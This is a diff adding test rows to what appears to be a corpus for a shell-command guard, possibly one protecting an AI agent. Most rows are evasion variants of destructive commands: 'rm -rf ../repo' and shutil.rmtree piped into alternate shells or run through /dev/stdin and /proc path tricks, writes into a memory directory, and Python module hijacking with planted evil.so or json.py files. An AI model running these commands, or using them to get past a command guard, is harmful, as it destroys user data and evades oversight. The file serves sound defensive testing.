@@ -826,3 +826,916 @@ added by CRW-951 (fix round 4: verifier P1 finding of 72bc2e989)	python3 -c 'fro
 added by CRW-951 (fix round 4: verifier P1 finding of 72bc2e989)	python3 -c 'import os; exec("print(\"io\x2eopen(\x27w\x27)\")"); print(os.path.exists("{MEMORY}/n.md"))'	CRW-951-exec-10-decoded-mode-open-data	row	-
 added by CRW-951 (fix round 4: verifier P1 finding of 72bc2e989)	python3 -c 'import os; exec("print(\"a\x5bi]\")"); print(os.path.exists("{MEMORY}/n.md"))'	CRW-951-exec-11-decoded-subscript-data	row	-
 added by CRW-951 (fix round 4: verifier P1 finding of 72bc2e989)	python3 -c 'import os; k="w"; exec("os.__dict__\x5bk]")'	CRW-951-exec-12-decoded-subscript-call	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf 'rm -rf ../repo' | ash	CRW-894-sf-01	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf 'rm -rf ../repo' | mksh	CRW-894-sf-02	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf 'rm -rf ../repo' | hush	CRW-894-sf-03	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf 'rm -rf ../repo' | pdksh	CRW-894-sf-04	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf 'rm -rf ../repo' | oksh	CRW-894-sf-05	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf 'rm -rf ../repo' | posh	CRW-894-sf-06	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf 'rm -rf ../repo' | yash	CRW-894-sf-07	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf 'rm -rf ../repo' | rbash	CRW-894-sf-08	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf 'rm -rf ../repo' | busybox ash	CRW-894-sf-09	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf 'rm -rf ../repo' | busybox hush	CRW-894-sf-10	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf 'rm -rf ../repo' | busybox sh	CRW-894-sf-11	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf 'rm -rf ../repo' | /bin/busybox ash	CRW-894-sf-12	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf 'rm -rf ../repo' | /bin/busybox sh	CRW-894-sf-13	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf 'rm -rf ../repo' | busybox	CRW-894-sf-14	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf 'rm -rf ../repo' | /bin/busybox	CRW-894-sf-15	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf 'rm -rf ../repo' | exec -a x ash	CRW-894-sf-16	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf 'rm -rf ../repo' | nohup mksh	CRW-894-sf-17	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf 'rm -rf ../repo' | env X=1 ash	CRW-894-sf-18	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf 'rm -rf ../repo' | sudo mksh	CRW-894-sf-19	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf 'rm -rf ../repo' | nohup busybox ash	CRW-894-sf-20	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf x | ash -c 'ash'	CRW-894-sf-21	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf x | mksh -c 'exec mksh'	CRW-894-sf-22	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf x | busybox ash -c 'ash'	CRW-894-sf-23	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf x | eval ash	CRW-894-sf-24	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf x | su -c 'ash'	CRW-894-sf-25	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf x | su --command='mksh'	CRW-894-sf-26	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf 'rm -rf ../repo' | ash </dev/stdin	CRW-894-sf-27	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf 'rm -rf ../repo' | mksh 3</dev/fd/0 </dev/null <&3	CRW-894-sf-28	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf x | if false; then :; elif bash; then :; fi	CRW-894-sf-29	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf x | while bash; do :; done	CRW-894-sf-30	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf x | until bash; do :; done	CRW-894-sf-31	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf x | if bash; then :; fi	CRW-894-sf-32	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf x | ! bash	CRW-894-sf-33	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf x | if false; then :; elif ash; then :; fi	CRW-894-sf-34	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf x | while ash; do :; done	CRW-894-sf-35	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf x | until ash; do :; done	CRW-894-sf-36	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf x | if ash; then :; fi	CRW-894-sf-37	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf x | ! ash	CRW-894-sf-38	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf x | if false; then :; elif mksh; then :; fi	CRW-894-sf-39	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf x | while mksh; do :; done	CRW-894-sf-40	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf x | until mksh; do :; done	CRW-894-sf-41	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf x | if mksh; then :; fi	CRW-894-sf-42	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf x | ! mksh	CRW-894-sf-43	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	ash <<< 'rm -rf ../repo'	CRW-894-sf-44	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	ash -c 'rm -rf ../repo'	CRW-894-sf-45	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	ash <<'EOF' / rm -rf ../repo / EOF	CRW-894-sf-46	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	ash -c 'echo hi > {MEMORY}/a'	CRW-894-sf-47	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	ash <<< 'echo hi > {MEMORY}/a'	CRW-894-sf-48	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	mksh <<< 'rm -rf ../repo'	CRW-894-sf-49	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	mksh -c 'rm -rf ../repo'	CRW-894-sf-50	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	mksh <<'EOF' / rm -rf ../repo / EOF	CRW-894-sf-51	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	mksh -c 'echo hi > {MEMORY}/a'	CRW-894-sf-52	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	mksh <<< 'echo hi > {MEMORY}/a'	CRW-894-sf-53	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	busybox ash <<< 'rm -rf ../repo'	CRW-894-sf-54	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	busybox ash -c 'rm -rf ../repo'	CRW-894-sf-55	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	busybox ash <<'EOF' / rm -rf ../repo / EOF	CRW-894-sf-56	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	busybox ash -c 'echo hi > {MEMORY}/a'	CRW-894-sf-57	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	busybox ash <<< 'echo hi > {MEMORY}/a'	CRW-894-sf-58	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	busybox sh <<< 'rm -rf ../repo'	CRW-894-sf-59	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	busybox sh -c 'rm -rf ../repo'	CRW-894-sf-60	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	busybox sh <<'EOF' / rm -rf ../repo / EOF	CRW-894-sf-61	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	busybox sh -c 'echo hi > {MEMORY}/a'	CRW-894-sf-62	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	busybox sh <<< 'echo hi > {MEMORY}/a'	CRW-894-sf-63	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	/bin/busybox ash <<< 'rm -rf ../repo'	CRW-894-sf-64	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	/bin/busybox ash -c 'rm -rf ../repo'	CRW-894-sf-65	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	/bin/busybox ash <<'EOF' / rm -rf ../repo / EOF	CRW-894-sf-66	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	/bin/busybox ash -c 'echo hi > {MEMORY}/a'	CRW-894-sf-67	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	/bin/busybox ash <<< 'echo hi > {MEMORY}/a'	CRW-894-sf-68	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	su -c "ash -c 'rm -rf ../repo'"	CRW-894-sf-69	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	su --command="mksh -c 'echo hi > {MEMORY}/a'"	CRW-894-sf-70	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	bash -c "ash -c 'rm -rf ../repo'"	CRW-894-sf-71	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf x | ash -c 'rm -rf ../repo'	CRW-894-sf-72	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	ash -c 'echo hi'	CRW-894-sf-73	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	mksh -c 'echo hi'	CRW-894-sf-74	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	busybox ash -c 'echo hi'	CRW-894-sf-75	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf x | ash -c 'echo hi'	CRW-894-sf-76	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf x | busybox cat	CRW-894-sf-77	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	busybox ls	CRW-894-sf-78	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	busybox	CRW-894-sf-79	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	/bin/busybox	CRW-894-sf-80	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf x | (cd sub; cat)	CRW-894-sf-81	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf x | cat ash	CRW-894-sf-82	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	echo ash mksh busybox	CRW-894-sf-83	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf x | if false; then :; elif cat; then :; fi	CRW-894-sf-84	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf x | while cat; do :; done	CRW-894-sf-85	row	-
+recheck-20261009 + verifier c9(c)/c10(c) (CRW-894 shell family)	printf x | until cat; do :; done	CRW-894-sf-86	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d1)	printf 'import shutil; shutil.rmtree("../repo")\n' | python3 /dev/./stdin	CRW-894-ev-01	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d1)	printf 'import shutil; shutil.rmtree("../repo")\n' | python3 //dev/stdin	CRW-894-ev-02	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d1)	printf 'import shutil; shutil.rmtree("../repo")\n' | python3 /dev/../dev/stdin	CRW-894-ev-03	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d1)	printf 'import shutil; shutil.rmtree("../repo")\n' | python3 /dev//fd//0	CRW-894-ev-04	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d1)	printf 'import shutil; shutil.rmtree("../repo")\n' | python3 /proc/self/../self/fd/0	CRW-894-ev-05	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d1)	printf 'import shutil; shutil.rmtree("../repo")\n' | python3 /proc/self/root/dev/stdin	CRW-894-ev-06	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d1)	printf 'import shutil; shutil.rmtree("../repo")\n' | python3 -- /dev/./stdin	CRW-894-ev-07	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d1)	printf 'import shutil; shutil.rmtree("../repo")\n' | node /dev/./stdin	CRW-894-ev-08	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d1)	printf 'import shutil; shutil.rmtree("../repo")\n' | perl /dev/./stdin	CRW-894-ev-09	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d1)	printf 'import shutil; shutil.rmtree("../repo")\n' | php /dev/./stdin	CRW-894-ev-10	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d1)	printf 'rm -rf ../repo\n' | bash /dev/./stdin	CRW-894-ev-11	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d1)	printf 'rm -rf ../repo\n' | sh /dev//stdin	CRW-894-ev-12	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d1)	printf 'rm -rf ../repo\n' | source /dev/./stdin	CRW-894-ev-13	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d1)	printf 'rm -rf ../repo\n' | . /dev/./stdin	CRW-894-ev-14	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d1)	printf 'rm -rf ../repo\n' | bash </dev/./stdin	CRW-894-ev-15	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d1)	printf 'rm -rf ../repo\n' | ash </dev//fd/0	CRW-894-ev-16	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d1)	cd /dev; printf 'import shutil; shutil.rmtree("../repo")\n' | python3 stdin	CRW-894-ev-17	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d1)	cd /proc/self/fd; printf 'import shutil; shutil.rmtree("../repo")\n' | python3 0	CRW-894-ev-18	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d1)	cd /dev; printf 'import shutil; shutil.rmtree("../repo")\n' | python3 /proc/self/cwd/stdin	CRW-894-ev-19	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d1)	cd /dev; printf 'rm -rf ../repo\n' | bash <stdin	CRW-894-ev-20	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d1)	python3 /dev/./stdin <<< 'import shutil; shutil.rmtree("../repo")'	CRW-894-ev-21	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d1)	printf x | python3 ./dev/stdin	CRW-894-ev-22	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d1)	printf x | python3 /dev/null	CRW-894-ev-23	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d1)	printf x | python3 script.py	CRW-894-ev-24	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d2)	printf 'rm -rf ../repo\n' | bash -s safe.sh	CRW-894-ev-25	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d2)	printf 'rm -rf ../repo\n' | ash -s safe.sh	CRW-894-ev-26	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d2)	printf 'rm -rf ../repo\n' | mksh -s safe.sh arg	CRW-894-ev-27	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d2)	printf 'rm -rf ../repo\n' | bash -s -- safe.sh	CRW-894-ev-28	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d2)	printf 'rm -rf ../repo\n' | bash -xs safe.sh	CRW-894-ev-29	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d2)	printf 'rm -rf ../repo\n' | bash -os posix safe.sh	CRW-894-ev-30	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d2)	printf 'rm -rf ../repo\n' | bash +s safe.sh	CRW-894-ev-31	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d2)	printf 'rm -rf ../repo\n' | busybox ash -s safe.sh	CRW-894-ev-32	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d2)	printf 'rm -rf ../repo\n' | sh -s safe.sh	CRW-894-ev-33	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d2)	printf 'rm -rf ../repo\n' | zsh -s safe.sh	CRW-894-ev-34	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d2)	printf 'rm -rf ../repo\n' | dash -s safe.sh	CRW-894-ev-35	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d2)	bash -s safe.sh <<'EOF'\nrm -rf ../repo\nEOF	CRW-894-ev-36	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d2)	bash -s arg <<< ':'	CRW-894-ev-37	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d2)	bash -sc 'echo hi' safe.sh	CRW-894-ev-38	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d2)	printf 'rm -rf ../repo\n' | bash safe.sh	CRW-894-ev-39	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d3)	printf 'gh pr create --title T --body hi\n' | ./runner.sh	CRW-894-ev-40	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d3)	printf 'gh pr create --title T --body hi\n' | ./runner.sh	CRW-894-ev-41	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d3)	printf 'gh pr create --title T --body hi\n' | ./runner.sh	CRW-894-ev-42	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d3)	printf 'gh pr create --title T --body hi\n' | ./runner.sh	CRW-894-ev-43	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d3)	printf 'gh pr create --title T --body hi\n' | ./runner.sh	CRW-894-ev-44	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d3)	printf 'gh pr create --title T --body hi\n' | ./runner.sh	CRW-894-ev-45	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d3)	printf 'gh pr create --title T --body hi\n' | ./runner.sh	CRW-894-ev-46	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d3)	printf 'gh pr create --title T --body hi\n' | ./runner.sh	CRW-894-ev-47	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d3)	printf 'gh pr create --title T --body hi\n' | ./runner.sh	CRW-894-ev-48	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d3)	printf 'gh pr create --title T --body hi\n' | ./runner.sh	CRW-894-ev-49	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d3)	./runner.sh	CRW-894-ev-50	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d3)	./runner.py	CRW-894-ev-51	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d4)	printf x | python3 -m json.tool	CRW-894-ev-52	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d4)	printf x | python3 -m json.tool --sort-keys	CRW-894-ev-53	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d4)	printf x | python3 -m json.tool --indent 2	CRW-894-ev-54	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d4)	printf x | python3 -m json.tool --indent=2	CRW-894-ev-55	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d4)	printf x | python3 -m json.tool --no-ensure-ascii --tab	CRW-894-ev-56	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d4)	printf x | python3 -mjson.tool	CRW-894-ev-57	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d4)	printf x | python3 -B -m json.tool	CRW-894-ev-58	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d4)	printf x | python3 -m json.tool - {MEMORY}/a.md	CRW-894-ev-59	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d4)	printf x | python3 -m json.tool in.json	CRW-894-ev-60	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d4)	printf x | python3 -m pdb	CRW-894-ev-61	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d4)	printf x | python3 -m json	CRW-894-ev-62	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d4)	printf x | python3 -m json.tool.evil	CRW-894-ev-63	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d4)	printf x | python3 -c 'print(1)' -m json.tool	CRW-894-ev-64	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d4)	printf x | python3 -m json.tool -c 'import os'	CRW-894-ev-65	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d4)	printf x | python3 -m	CRW-894-ev-66	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d1)	printf 'x' | php "$(echo /dev/./stdin)"	CRW-894-ev-67	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d1)	printf 'x' | php script.php	CRW-894-ev-68	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d2)	bash -oc posix 'echo hi'	CRW-894-ev-69	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d1)	printf 'import shutil; shutil.rmtree("../repo")\n' | python3 -i safe.py	CRW-894-ev-70	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d1)	printf 'import shutil; shutil.rmtree("../repo")\n' | python3 -i -c 'pass'	CRW-894-ev-71	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d1)	printf 'require("fs").rmSync("../repo",{recursive:true})\n' | node -e 0 -i	CRW-894-ev-72	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d1)	python3 -i safe.py <<'EOF'\nimport shutil; shutil.rmtree("../repo")\nEOF	CRW-894-ev-73	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d1)	python3 -i safe.py	CRW-894-ev-74	row	-
+pre-eval-crw894-1688f7c5.json (CRW-894 d1)	printf x | python3 safe.py	CRW-894-ev-75	row	-
+verifier of 4636e20a (CRW-894 f1)	printf 'import shutil; shutil.rmtree("../repo")\n' | python3 /proc/self/root/../../dev/stdin	CRW-894-vf-01	row	-
+verifier of 4636e20a (CRW-894 f1)	cd /; printf 'import shutil; shutil.rmtree("../repo")\n' | python3 /proc/self/cwd/../dev/stdin	CRW-894-vf-02	row	-
+verifier of 4636e20a (CRW-894 f1)	printf 'rm -rf ../repo\n' | bash /proc/self/root/../../dev/stdin	CRW-894-vf-03	row	-
+verifier of 4636e20a (CRW-894 f1)	printf 'rm -rf ../repo\n' | bash </proc/self/root/../dev/stdin	CRW-894-vf-04	row	-
+verifier of 4636e20a (CRW-894 f1)	printf 'import shutil; shutil.rmtree("../repo")\n' | node /proc/1/root/../../dev/fd/0	CRW-894-vf-05	row	-
+verifier of 4636e20a (CRW-894 f2)	cd "$DIR"; printf 'import shutil; shutil.rmtree("../repo")\n' | python3 dev/stdin	CRW-894-vf-06	row	-
+verifier of 4636e20a (CRW-894 f2)	cd "$DIR"; printf 'import shutil; shutil.rmtree("../repo")\n' | python3 dev/fd/0	CRW-894-vf-07	row	-
+verifier of 4636e20a (CRW-894 f2)	cd "$DIR"; printf 'import shutil; shutil.rmtree("../repo")\n' | python3 proc/self/fd/0	CRW-894-vf-08	row	-
+verifier of 4636e20a (CRW-894 f2)	cd "$DIR"; printf 'import shutil; shutil.rmtree("../repo")\n' | python3 0	CRW-894-vf-09	row	-
+verifier of 4636e20a (CRW-894 f2)	cd "$DIR"; printf 'import shutil; shutil.rmtree("../repo")\n' | python3 fd/0	CRW-894-vf-10	row	-
+verifier of 4636e20a (CRW-894 f2)	cd "$DIR"; printf 'import shutil; shutil.rmtree("../repo")\n' | python3 ./dev/./stdin	CRW-894-vf-11	row	-
+verifier of 4636e20a (CRW-894 f2)	cd "$DIR"; printf 'import shutil; shutil.rmtree("../repo")\n' | python3 ../../dev/stdin	CRW-894-vf-12	row	-
+verifier of 4636e20a (CRW-894 f2)	cd "$DIR"; printf 'import shutil; shutil.rmtree("../repo")\n' | python3 proc/self/root/../dev/stdin	CRW-894-vf-13	row	-
+verifier of 4636e20a (CRW-894 f2)	cd "$DIR"; printf 'import shutil; shutil.rmtree("../repo")\n' | node dev/stdin	CRW-894-vf-14	row	-
+verifier of 4636e20a (CRW-894 f2)	cd "$DIR"; printf 'import shutil; shutil.rmtree("../repo")\n' | perl dev/stdin	CRW-894-vf-15	row	-
+verifier of 4636e20a (CRW-894 f2)	cd "$DIR"; printf 'import shutil; shutil.rmtree("../repo")\n' | php dev/stdin	CRW-894-vf-16	row	-
+verifier of 4636e20a (CRW-894 f2)	cd "$DIR"; printf 'rm -rf ../repo\n' | bash dev/stdin	CRW-894-vf-17	row	-
+verifier of 4636e20a (CRW-894 f2)	cd "$DIR"; printf 'rm -rf ../repo\n' | bash <dev/fd/0	CRW-894-vf-18	row	-
+verifier of 4636e20a (CRW-894 f4)	cd "$DIR"; printf x | python3 ../tools/gen.py	CRW-894-vf-19	row	-
+verifier of 4636e20a (CRW-894 f4)	cd "$DIR"; printf x | python3 build/fd/gen.py	CRW-894-vf-20	row	-
+verifier of 4636e20a (CRW-894 f4)	cd "$DIR"; printf x | python3 fd/gen.py	CRW-894-vf-21	row	-
+verifier of 4636e20a (CRW-894 f4)	cd "$DIR"; printf x | python3 stdin_reader.py	CRW-894-vf-22	row	-
+verifier of 4636e20a (CRW-894 f4)	cd "$DIR"; printf x | python3 ../stdin.py	CRW-894-vf-23	row	-
+verifier of 4636e20a (CRW-894 f4)	cd "$DIR"; printf x | python3 ./tools/fd10.py	CRW-894-vf-24	row	-
+verifier of 4636e20a (CRW-894 f4)	cd "$DIR"; printf x | node ../tools/gen.js	CRW-894-vf-25	row	-
+verifier of 4636e20a (CRW-894 f3)	printf x | python3 -m json.tool	CRW-894-vf-26	row	-
+verifier of 4636e20a (CRW-894 f3)	printf x | python3 -m json.tool	CRW-894-vf-27	row	-
+verifier of 4636e20a (CRW-894 f3)	printf x | python3 -m json.tool	CRW-894-vf-28	row	-
+verifier of 4636e20a (CRW-894 f3)	printf x | python3 -m json.tool	CRW-894-vf-29	row	-
+verifier of 4636e20a (CRW-894 f3)	printf x | python3 -m json.tool	CRW-894-vf-30	row	-
+verifier of 4636e20a (CRW-894 f3)	printf x | python3 -m json.tool --sort-keys	CRW-894-vf-31	row	-
+verifier of 4636e20a (CRW-894 f3)	mkdir json; printf 'print(1)' > json/__init__.py; printf x | python3 -m json.tool	CRW-894-vf-32	row	-
+verifier of 4636e20a (CRW-894 f3)	cp evil.py json.py; printf x | python3 -m json.tool	CRW-894-vf-33	row	-
+verifier of 4636e20a (CRW-894 f3)	cd "$DIR"; printf x | python3 -m json.tool	CRW-894-vf-34	row	-
+verifier of 4636e20a (CRW-894 f3)	printf x | python3 -m json.tool	CRW-894-vf-35	row	-
+verifier of 4636e20a (CRW-894 f3)	printf x | python3 -m json.tool	CRW-894-vf-36	row	-
+verifier of 4636e20a (CRW-894 f3)	printf x | python3 -m json.tool	CRW-894-vf-37	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	cp evil.so json.so; printf '{}' | python3 -m json.tool	CRW-894-vr-01	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	cp evil.so json/__init__.so; printf '{}' | python3 -m json.tool	CRW-894-vr-02	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	cp evil.so json.cpython-312-x86_64-linux-gnu.so; printf '{}' | python3 -m json.tool	CRW-894-vr-03	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	cp evil.so json.abi3.so; printf '{}' | python3 -m json.tool	CRW-894-vr-04	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	cat evil.so > json.so; printf '{}' | python3 -m json.tool	CRW-894-vr-05	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	cat evil.so > json/__init__.cpython-312-x86_64-linux-gnu.so; printf '{}' | python3 -m json.tool	CRW-894-vr-06	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	cat evil.so >> json.so; printf '{}' | python3 -m json.tool	CRW-894-vr-07	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	cat evil.so | tee json.so >/dev/null; printf '{}' | python3 -m json.tool	CRW-894-vr-08	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	cp -r pkg json; printf '{}' | python3 -m json.tool	CRW-894-vr-09	row	-
